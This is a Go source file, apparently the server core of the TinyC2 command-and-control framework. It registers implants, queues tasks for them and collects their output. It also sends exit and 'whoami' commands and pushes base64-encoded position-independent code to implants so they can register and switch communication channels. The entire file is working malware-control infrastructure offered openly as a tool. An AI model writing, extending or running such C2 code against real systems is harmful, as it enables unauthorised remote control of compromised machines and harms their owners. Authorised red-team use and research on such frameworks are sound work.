package core

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"time"
	"github.com/0xPrimo/TinyC2/server/internal/pkg/logger"

	"github.com/pterm/pterm"
)

type Implant struct {
	ID       uint32
	Seen     time.Time
	Channel  string
	Tasks    []map[string]any
	Channels map[string]uint32
}

type ImplantResponse struct {
	ID   uint32         `json:"id"`
	Task map[string]any `json:"task"`
}

func (e *Engine) ImplantProcess(listener string, data []byte) ([]byte, error) {
	var (
		response ImplantResponse
	)

	err := json.Unmarshal(data, &response)
	if err != nil {
		logger.Error("error parsing JSON: %v", err)
		return nil, err
	}

	if !e.ImplantExists(response.ID) {
		return e.ImplantRegister(response.ID, listener)
	} else {
		return e.ImplantHandleResponse(response.ID, response.Task)
	}
}

func (e *Engine) ImplantRegister(id uint32, listener string) ([]byte, error) {
	if e.ImplantExists(id) {
		return []byte{}, fmt.Errorf("implant already exists")
	}

	e.Implants[id] = Implant{
		ID:      id,
		Channel: listener,
		Channels: map[string]uint32{
			listener: 0,
		},
	}

	data, err := json.Marshal(map[string]any{"magic": "baadf00d"})
	if err != nil {
		logger.Error("error marshaling JSON: %v", err)
		return []byte{}, err
	}

	fmt.Println()
	logger.Success("implant %X registred", id)

	return data, nil
}

func (e *Engine) ImplantHandleResponse(id uint32, tasks map[string]any) ([]byte, error) {
	err := e.ImplantTaskHandler(id, tasks)
	if err != nil {
		logger.Error("failed to handle task: %v", err)
		return e.ImplantTaskQueue(id), err
	}

	return e.ImplantTaskQueue(id), nil
}

func (e *Engine) ImplantTaskHandler(id uint32, task map[string]any) error {
	implant, _ := e.Implants[id]
	implant.Seen = time.Now()
	e.Implants[id] = implant

	// handle implant task response
	if task["output"] != nil {
		logger.Success("received output:\n%s\n", task["output"])
	}

	return nil
}

func (e *Engine) ImplantTaskExecute(id uint32, task map[string]any) {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %X does not exists", pterm.Cyan(id))
		return
	}

	implant.Tasks = append(implant.Tasks, task)
	e.Implants[id] = implant
}

func (e *Engine) ImplantTaskQueue(id uint32) []byte {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %X does not exists", pterm.Cyan(id))
		return []byte{}
	}

	tasks := implant.Tasks
	implant.Tasks = []map[string]any{}
	e.Implants[id] = implant

	data, err := json.Marshal(tasks)
	if err != nil {
		logger.Error("error marshaling JSON: %v", err)
		return []byte{}
	}

	if len(tasks) > 0 {
		fmt.Println()
		logger.Info("sent %d bytes to implant %X", len(data), id)
	}

	return data
}

func (e *Engine) ImplantExists(id uint32) bool {
	_, exists := e.Implants[id]
	if !exists {
		return false
	}
	return true
}

func (e *Engine) ImplantIsAlive(id uint32) bool {
	implant, exists := e.Implants[id]
	if !exists {
		return false
	}

	return time.Since(implant.Seen) <= 5*time.Second
}

func (e *Engine) ImplantKill(id uint32) error {
	if !e.ImplantExists(id) {
		logger.Error("implant %X does not exists", id)
		return nil
	}

	// execute exit command
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "exit",
		"args":     nil,
		"artifact": nil,
	})
	return nil
}

func (e *Engine) ImplantList() error {

	table := pterm.TableData{
		{"ID", "Listener", "Status"},
	}

	for id, implant := range e.Implants {
		if e.ImplantIsAlive(id) {
			table = append(table, []string{pterm.Cyan(fmt.Sprintf("%X", id)), implant.Channel, pterm.Green("alive")})
		} else {
			table = append(table, []string{pterm.Cyan(fmt.Sprintf("%X", id)), implant.Channel, pterm.Red("dead")})
		}
	}

	pterm.Println()
	pterm.DefaultTable.
		WithHasHeader().
		WithBoxed().
		WithHeaderStyle(pterm.NewStyle(pterm.FgLightMagenta, pterm.Bold)).
		WithData(table).
		Render()
	pterm.Println()

	return nil
}

func (e *Engine) ImplantChannelList(id uint32) error {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %X does not exists", id)
		return nil
	}

	table := pterm.TableData{
		{"ID", "Name"},
	}

	for name, id := range implant.Channels {
		if implant.Channel == name {
			table = append(table, []string{pterm.Green(fmt.Sprintf("* %X", id)), pterm.Green(name)})
		} else {
			table = append(table, []string{pterm.Cyan(fmt.Sprintf("%X", id)), name})
		}
	}

	pterm.Println()
	pterm.DefaultTable.
		WithHasHeader().
		WithBoxed().
		WithHeaderStyle(pterm.NewStyle(pterm.FgLightMagenta, pterm.Bold)).
		WithData(table).
		Render()
	pterm.Println()

	return nil
}

func (e *Engine) ImplantChannelRegister(id uint32, name string) error {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %X does not exists", pterm.Cyan(id))
		return nil
	}

	// generate pic
	listener, exists := e.Listeners[name]
	if !exists {
		logger.Error("listener %s does not exists", name)
		return nil
	}

	if listener.ID == 0 {
		logger.Error("%s is a default channel", name)
		return nil
	}

	pic, err := listener.Interface.MakePic(listener.ID)
	if err != nil {
		logger.Error("MakePic error: %v", err)
		return nil
	}

	implant.Channels[name] = listener.ID
	e.Implants[id] = implant

	// execute channel.register command
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "channel.register",
		"args":     []uint32{listener.ID},
		"artifact": base64.StdEncoding.EncodeToString(pic),
	})

	return nil
}

func (e *Engine) ImplantChannelSwitch(id uint32, name string) error {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %X does not exists", id)
		return nil
	}

	if implant.Channel == name {
		logger.Error("channel %s is currently used", name)
		return nil
	}

	channel, exists := implant.Channels[name]
	if !exists {
		logger.Error("channel %s not registered", name)
		return nil
	}

	implant.Channel = name
	e.Implants[id] = implant

	// execute channel.swtich command
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "channel.switch",
		"args":     []uint32{channel},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantChannelRemove(id uint32, name string) error {
	implant, exists := e.Implants[id]
	if !exists {
		logger.Error("implant %X does not exists", id)
		return nil
	}

	channel, exists := implant.Channels[name]
	if !exists {
		logger.Error("channel %s not registered", name)
		return nil
	}

	if name == implant.Channel {
		logger.Error("channel %s is currently used", name)
		return nil
	}

	if channel == 0 {
		logger.Error("%s channel is a default channel", name)
		return nil
	}

	delete(implant.Channels, name)
	e.Implants[id] = implant

	// execute channel.remove command
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "channel.remove",
		"args":     []uint32{channel},
		"artifact": nil,
	})

	return nil
}

func (e *Engine) ImplantWhoami(id uint32) error {
	// execute whoami command
	e.ImplantTaskExecute(id, map[string]any{
		"name":     "whoami",
		"args":     nil,
		"artifact": nil,
	})

	return nil
}
